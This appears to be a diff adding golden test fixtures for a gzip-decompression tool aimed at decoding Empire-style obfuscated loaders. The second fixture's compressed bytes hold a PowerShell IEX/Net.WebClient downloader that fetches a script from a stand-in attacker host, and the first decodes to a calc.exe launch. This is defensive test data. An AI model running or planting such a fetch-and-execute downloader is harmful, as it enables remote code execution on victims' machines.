@@ -1,0 +1,5 @@
+# gzip-decompress · Golden Fixtures · RC3.2a
+# GZip magic 1f 8b — Empire / gzip+base64 loader pattern.
+# Inputs are the RAW gzip bytes serialised as latin-1 JSON strings.
+{"case_id": "gzip-plain", "description": "Gzip stream \u2192 'powershell.exe -c calc.exe'", "input": "\u001f\u008b\b\u0000<\u00c7]j\u0002\u00ff+\u00c8/O-*\u00ceH\u00cd\u00c9\u00d1K\u00adHU\u00d0MVHN\u00ccI\u0006\u00b1\u0001e\u00ec\u001b\u00a6\u001a\u0000\u0000\u0000", "detect_min_confidence": 0.5, "expected_output": "powershell.exe -c calc.exe"}
+{"case_id": "gzip-ps-downloader", "description": "Gzip \u2192 Empire IEX downloader", "input": "\u001f\u008b\b\u0000<\u00c7]j\u0002\u00ff\u00f3t\u008d\u00d0\u00f0K-\u00d7\u00f5O\u00caJM.Q\u00f0K-\u00d1\u000bOMr\u00ce\u00c9L\u00cd+\u00d1\u00d4s\u00c9/\u00cf\u00cb\u00c9OL\t.)\u00ca\u00ccK\u00d7P\u00ca())\u00b0\u00d2\u00d7O-\u00cb\u00cc\u00d1K\u00adH\u00cc-\u00c8I\u00d5K\u00ce\u00cf\u00d5\u00af\u00d0+(6T\u00d2\u0004\u0000\u00d7\u00ec\u0080AM\u0000\u0000\u0000", "detect_min_confidence": 0.5, "expected_output_contains": ["IEX", "New-Object Net.WebClient", "http://evil.example.com/x.ps1"]}
